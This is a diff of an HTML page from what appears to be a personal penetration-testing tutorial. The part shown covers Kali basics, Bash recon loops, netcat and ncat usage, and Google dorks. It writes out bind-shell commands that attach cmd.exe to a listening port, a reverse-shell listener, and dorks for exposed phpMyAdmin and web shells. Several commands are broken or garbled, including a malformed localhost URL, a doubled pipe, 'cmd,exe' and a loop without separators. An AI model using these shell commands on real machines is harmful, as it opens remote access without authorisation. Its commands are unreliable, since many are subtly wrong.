+  <a href="#nse-scripts_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NSE SCRIPTS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB ENUMERATION
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB ENUMERATION">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#smb-null-sessions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB NULL SESSIONS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enum4linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ENUM4LINUX
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-nse-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB NSE SCRIPTS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smtp-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMTP ENUMERATION
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMTP ENUMERATION">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vrfy-script" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VRFY SCRIPT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python-port" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PYTHON PORT
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#snmp-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SNMP ENUMERATION
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SNMP ENUMERATION">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#snmp-mib" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SNMP MIB
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#snmpwalk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SNMPWALK
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-5-vulnerability-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 5 - VULNERABILITY SCANNING
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 5 - VULNERABILITY SCANNING">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#more-nse-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MORE NSE SCRIPTS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#openvas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OPENVAS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-6-intro-to-overflows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 6 - INTRO TO OVERFLOWS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 6 - INTRO TO OVERFLOWS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VULNERABLE CODE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stack-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        STACK OVERFLOW
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-7-windows-buffer-overflow-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 7 - WINDOWS BUFFER OVERFLOW EXAMPLE
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 7 - WINDOWS BUFFER OVERFLOW EXAMPLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FUZZING
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crash-replication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CRASH REPLICATION
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#controlling-eip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CONTROLLING EIP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#introducing-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        INTRODUCING SHELLCODE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bad-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BAD CHARACTERS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#redirecting-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        REDIRECTING EXECUTION
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#introducing-mona" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        INTRODUCING MONA
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SHELLCODE PAYLOAD
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-8-linux-buffer-overflow-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 8 - LINUX BUFFER OVERFLOW EXAMPLE
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 8 - LINUX BUFFER OVERFLOW EXAMPLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#controlling-eip_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CONTROLLING EIP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#locating-space" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LOCATING SPACE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#first-stage-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FIRST STAGE SHELLCODE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#locating-ret" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LOCATING RET
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generating-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GENERATING SHELLCODE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-9-using-public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 9 - USING PUBLIC EXPLOITS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 9 - USING PUBLIC EXPLOITS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FINDING EXPLOITS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-db" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EXPLOIT-DB
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fixing-exploits-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FIXING EXPLOITS #1
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fixing-exploits-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FIXING EXPLOITS #2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-compiling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CROSS COMPILING
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-10-file-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 10 - FILE TRANSFERS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 10 - FILE TRANSFERS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tftp-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TFTP TRANSFERS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP TRANSFERS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vbscript-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VBSCRIPT TRANSFERS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        POWERSHELL TRANSFERS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-11-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 11 - PRIVILEGE ESCALATION
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 11 - PRIVILEGE ESCALATION">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LINUX ROOT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WINDOWS SYSTEM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-weak-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WINDOWS WEAK SERVICES
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux-weak-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LINUX WEAK SERVICES
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-12-client-side-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 12 - CLIENT SIDE ATTACKS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 12 - CLIENT SIDE ATTACKS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#replacing-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        REPLACING SHELLCODE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-applets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JAVA APPLETS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-13-web-application-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 13 - WEB APPLICATION ATTACKS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 13 - WEB APPLICATION ATTACKS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#local-file-inclusion-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LOCAL FILE INCLUSION SQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#injection-truncated-in-source" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        INJECTION (TRUNCATED IN SOURCE)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#essential-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Essential Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Essential Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat-ncat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NETCAT &amp; NCAT
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="NETCAT &amp; NCAT">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat-nc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Netcat (nc)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔹 Overview:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#features" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔹 Features:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔹 Example Usage:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ncat_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Ncat
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#overview_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔹 Overview:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enhanced-features" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔹 Enhanced Features:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-usage_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔹 Example Usage:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key-differences" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Key Differences:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wireshark_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wireshark
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Wireshark">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-features-of-wireshark" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Key Features of Wireshark:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-use-cases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Common Use Cases:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔧 Basic Workflow:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-filters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📦 Example Filters:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Note:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../.." class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2026-10-11 00:00:00+00:00" class="md-ellipsis">October 11, 2026</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../../category/tutorials/">Tutorials</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              12 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+<h2 id="module-1-introduction"><strong>MODULE 1 - INTRODUCTION</strong></h2>
+<h2 id="welcome">WELCOME</h2>
+<p><strong>Penetration testing</strong>, also known as <strong>pen testing</strong> or <strong>ethical hacking</strong>, is a simulated cyberattack against a computer system, network, or web application to identify and exploit security vulnerabilities. The goal is to assess the security posture of the system and determine whether unauthorized access or malicious activity is possible.</p>
+<h2 id="finding-files">FINDING FILES</h2>
+<p>In Kali Linux (and most Linux distributions), the <code>locate</code>, <code>which</code>, and <code>find</code> commands are used to search for files or determine their locations in different ways. Here’s a breakdown of each:</p>
+<h3 id="quick-file-search-using-a-database"><strong>Quick File Search Using a Database</strong></h3>
+<p>Syntax:</p>
+<p><code>locate &lt;filename&gt;</code> -Quick File Search</p>
+<p><strong>Description</strong>: Searches for files by name using a pre-built index.<br />
+<strong>Pros</strong>: <strong>Fast because it u</strong>ses a database (<code>/var/lib/mlocate/mlocate.db</code>) rather than searching the entire filesystem.</p>
+<p><strong>Cons</strong>: Might be outdated unless you update the index by below command:</p>
+<p><code>sudo updatedb -</code> update the index</p>
+<h3 id="find-location-of-executable-programs"><strong>Find Location of Executable Programs</strong></h3>
+<p>Systax:</p>
+<p><code>which python3</code> - Find Location of python3</p>
+<p>output : <code>/usr/bin/python3</code></p>
+<p><strong>Description</strong>: Tells you the full path of shell commands (executables).</p>
+<p><strong>Use case</strong>: Helpful for checking which version of a command will run.</p>
+<h3 id="advanced-file-search-tool"><strong>Advanced File Search Tool</strong></h3>
+<p>****<code>find /etc -name passwd</code> - <strong>searches the <code>/etc</code> directory and all its subdirectories</strong> for a file <strong>named exactly <code>passwd</code></strong>.</p>
+<p><strong>Output:</strong></p>
+<p>find /etc -name passwd</p>
+<p>find /etc -name passwd</p>
+<p>Syntax:-</p>
+<p><code>find /home/user -type f -size +10M</code> - Finds files larger than 10MB in user’s home</p>
+<p><strong>Pros</strong>: Powerful and flexible.</p>
+<p><strong>Cons</strong>: Slower than <code>locate</code> due to real-time scanning.</p>
+<h2 id="services-in-kali">SERVICES IN KALI</h2>
+<p>Kali Linux includes a variety of <strong>services</strong> that are either pre-installed or can be enabled for different penetration testing tasks.</p>
+<h3 id="ssh-service">SSH SERVICE</h3>
+<p><code>sudo service ssh start</code> - Start SSH Service</p>
+<p><code>netstat -antp | grep sshd</code> - Verify the SSH listening state</p>
+<p><code>ssh service stop</code> - Stop the SSH Service</p>
+<h3 id="http-service">HTTP SERVICE</h3>
+<p><code>service apache2 start</code> - start apache service</p>
+<p><strong>To verify apache status by open by below address in browser :</strong></p>
+<p><a href="http://127">http://127</a>..0.0.0/</p>
+<p><code>/var/www/</code> - Apache Document Root Directory</p>
+<p><strong>create a sample index page in apache root directory to test the web service is running fine.</strong></p>
+<p><code>echo “This is exmple of index page in Apache server running on Kali Linux” &gt; /var/www/index.html</code></p>
+<p><code>service apache2 stop</code> - stop apache service</p>
+<h3 id="service-management">SERVICE MANAGEMENT</h3>
+<p><code>/etc/init.d/ssh start</code> - start ssh service using SysV-style init scripts</p>
+<p><code>/etc/init.d/ssh stop</code> - stop ssh service using SysV-style init scripts</p>
+<p><code>/etc/init.d/apache2 restart</code> - restart apache service using SysV-style init scripts</p>
+<h3 id="boot-persistence">BOOT PERSISTENCE</h3>
+<p><code>update-rc.d ssh enable</code> - <strong>enable the SSH service to start automatically at boot time</strong>, when using <strong>SysV-style init scripts</strong>.</p>
+<p><code>update-rc.d apache2 enable</code> - <strong>enable the apache2 service to start automatically at boot time</strong>, when using <strong>SysV-style init scripts</strong>.</p>
+<p><strong>Manage Kali servive with <code>rccconf</code> and <code>sysv-rc-conf</code>:</strong></p>
+<p><code>sudo rccconf</code> - launches a <strong>simple text UI to manage the services</strong></p>
+<p><code>sudo sysv-rc-conf</code> -detailed curses-based UI to manage the services</p>
+<h3 id="bash-shell">BASH SHELL</h3>
+<p><strong>SCENARIO 1</strong></p>
+<p><code>wget [www.cisco.com](&lt;http://www.cisco.com&gt;)</code> - download index.html page to local system by wget</p>
+<p><code>more index.html</code> -<strong>view index.html files one page at a time</strong></p>
+<p><code>cat index.html | “grep href=”</code> - highlight the “href=” in index.html file</p>
+<p><strong>Reads <code>index.html</code>, finds lines with <code>href=</code>, extracts the domain part of URLs, and displays the output one screen at a time:-</strong></p>
+<p><code>cat index.html | grep "href=" | cut -d "/" -f3 | grep "cisco\.com" | cut -d'"' -f1 | | sort -u | more</code></p>
+<p><strong>This command is a shell pipeline that uses <code>grep</code>, <code>sort</code>, and some regular expressions to extract and process certain patterns from a file named <code>index.html</code>.</strong><br />
+<code>grep -o '[A-Za-z0-9_\.-]*\.*[cisco.com](&lt;http://cisco.com/&gt;)' index.html | sort -u</code></p>
+<p><strong>To extract all unique domain-like strings ending with <code>cisco.com</code> from the <code>index.html</code> file and save them into <code>cisco.txt</code>.</strong><br />
+<code>grep -o '[A-Za-z0-9_\.-]*\.*[cisco.com](&lt;http://cisco.com/&gt;)' index.html | sort -u &gt;cisco.txt</code></p>
+<p><code>cat cisco.txt</code></p>
+<p>Make a script file named : <strong><code>nano cisco.sh</code></strong>and write the below code then save it.</p>
+<p><code>#!/bin/bash</code></p>
+<p><code>for url in $(cat cisco.txt); do</code></p>
+<p><code>host $url | grep "has address" | cut -d" " -f4</code></p>
+<p><code>done</code></p>
+<p>Give the executable permission to this file.</p>
+<p><code>chmod 755 cisco.sh</code></p>
+<p>run the script</p>
+<p><code>./cisco.sh</code></p>
+<p>Output will look like this :</p>
+<p><img alt="image.png" src="attachment:33604d2f-0360-4abb-8f8c-f053b33df5ba:image.png" /></p>
+<p><strong>The one-liner command in the image is a compact Bash loop that extracts Cisco-related domains from <code>index.html</code>, resolves them to IP addresses, and prints the results.</strong></p>
+<p><code>for url in $(grep -o '[A-Za-z0-9_\.-]*\.*[cisco.com](&lt;http://cisco.com/&gt;)' index.html | sort -u); do host $url | grep "has address" | cut -d" " -f4 done</code></p>
+<h2 id="scenario-2">SCENARIO 2</h2>
+<p><code>ifconfig eth0</code> -</p>
+<p><code>ping 192.168.0.1</code> -</p>
+<p>create a script file named : nano <a href="http://ping-loop.sh">ping-loop.sh</a></p>
+<p><code>#!/bin/bash for ip in $(seq 200 210); do echo 192.168.31.$ip done</code></p>
+<p>give the executable permission:</p>
+<p><code>chmod 755 ping-loop.sh</code></p>
+<p>run the script:</p>
+<p><code>./ping-loop.sh</code></p>
+<p><strong>Output:</strong></p>
+<p><img alt="image.png" src="attachment:658d7436-9fbe-4fb6-954b-c635dd9a2b0b:image.png" /></p>
+<hr />
+<h1 id="module-2-essential-tools"><strong>MODULE 2 - ESSENTIAL TOOLS</strong></h1>
+<h2 id="netcat-">NETCAT -</h2>
+<p>Netcat (often shortened to <code>nc</code>) is a versatile command-line utility used for reading and writing data across network connections, supporting both TCP and UDP protocols. It's commonly used for network debugging, troubleshooting, and various network-related tasks, including port scanning, file transfers, and even creating basic chat servers. Think of it as a powerful, versatile tool for interacting with network services and protocols.</p>
+<h2 id="banner-grabbing">BANNER GRABBING</h2>
+<p>Banner grabbing is a technique used to gather information about software, services, and versions running on network hosts. This information can be used for both legitimate security purposes and malicious activities.</p>
+<p><code>nc -nv &lt;ip-address&gt; &lt;port-number&gt;</code></p>
+<h2 id="netcat-chat">NETCAT CHAT</h2>
+<p>copy the <code>nc.exe</code> in windows machine on below location:</p>
+<p><code>c:/windows/</code></p>
+<p>open cmd and type below commmand to start listening-</p>
+<p><code>nc -nlvp 4444</code></p>
+<p>now in kali linux machine type below command with windows machine’s ip address to connect the chat sessoin:</p>
+<p><code>nc -nv &lt;ip-address&gt;</code> 4444</p>
+<p>now start sending message.</p>
+<h2 id="executing-commands">EXECUTING COMMANDS</h2>
+<h2 id="bind-shell">BIND SHELL</h2>
+<p>A bind shell is <strong>a type of shell where the victim's machine actively opens a port on its network interface</strong>. Once this port is open, the attacker can connect to it, gaining remote terminal access to the victim's machine.</p>
+<p><strong>Run below On windows machine to start listening at port 4444 :</strong></p>
+<p><code>nc -lvp 4444 -e cmd.exe</code></p>
+<p><strong>On linux machine to connect blind shell:</strong></p>
+<p><code>ncat -v 192.168.30.35 4444 -- ssl</code></p>
+<h3 id="reverse-shell">REVERSE SHELL</h3>
+<p><strong>A reverse shell is a shell that is running on one computer but accepts requests and relays the responses to another computer.</strong></p>
+<p><code>nc -lvp 4444</code></p>
+<h2 id="ncat">NCAT</h2>
+<p>Ncat is <strong>a feature-packed networking utility which reads and writes data across networks from the command line</strong>. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat.</p>
+<p>copy the <code>ncat.exe</code> in windows machine on below location:</p>
+<p><code>c:/windows/</code></p>
+<p>open cmd on target windows machine and type below commmand to start listening on 4444-</p>
+<p><code>nc -lvp 4444 -e cmd,exe --allow &lt;ip-address&gt; --ssl</code></p>
+<p>executive the below command in attacher linux machine to connect the bliend shall:</p>
+<p><code>ncat -v &lt;ip-address&gt; 4444 --ssl</code></p>
+<h2 id="wireshark">WIRESHARK</h2>
+<p>Wireshark is a powerful and widely used network protocol analyzer that allows users to capture and examine data packets traveling through a network in real time. It provides deep visibility into network traffic, enabling detailed inspection of hundreds of supported protocols such as TCP, UDP, HTTP, and DNS. With its robust filtering capabilities, users can isolate specific traffic of interest, making it an essential tool for network troubleshooting, performance monitoring, security analysis, and protocol development. Available across multiple platforms including Windows, macOS, and Linux, Wireshark supports both live capture and analysis of previously recorded data. Due to its ability to access sensitive information, it must be used responsibly and only on networks where proper authorization has been granted.</p>
+<hr />
+<h1 id="module-3-passive-information-gathering"><strong>MODULE 3 - PASSIVE INFORMATION GATHERING</strong></h1>
+<h2 id="google-search">GOOGLE SEARCH</h2>
+<p>Google search hacking, also named Google dorking, is a hacker technique that uses Google Search and other Google applications to find security holes in the configuration and computer code that websites are using.</p>
+<h2 id="google-hacking">GOOGLE HACKING</h2>
+<p><code>site:google.com -site:www.google.com</code></p>
+<p><code>site:google.com filetype:pdf</code></p>
+<p><code>site:google.com filetype:pdf "Digital Awareness”</code></p>
+<p><code>intitle:"vnc viewer for java”</code></p>
+<p><code>inurl:"/control/userimahe.html”</code></p>
+<p><code>inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin</code></p>
+<p><code>intitle:"-N3t" filetype:php undetectable</code></p>
+<h2 id="ghdb">GHDB</h2>
+<p>A collection of search queries ("Google Dorks") used to find sensitive information and vulnerabilities indexed by Google.</p>
+<p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
+<hr />
+<h1 id="module-4-active-information-gathering"><strong>MODULE 4 - ACTIVE INFORMATION GATHERING</strong></h1>
+<h2 id="dns-enumeration">DNS ENUMERATION</h2>
+<p><strong>DNS enumeration</strong> is the process of collecting information about DNS (Domain Name System) records associated with a domain. It's commonly used in <strong>penetration testing</strong> and <strong>reconnaissance</strong> to discover potential targets within an organization’s network. Here's a quick breakdown:</p>
+<ul>
+<li><strong>A records</strong> – IP addresses of domain names.</li>
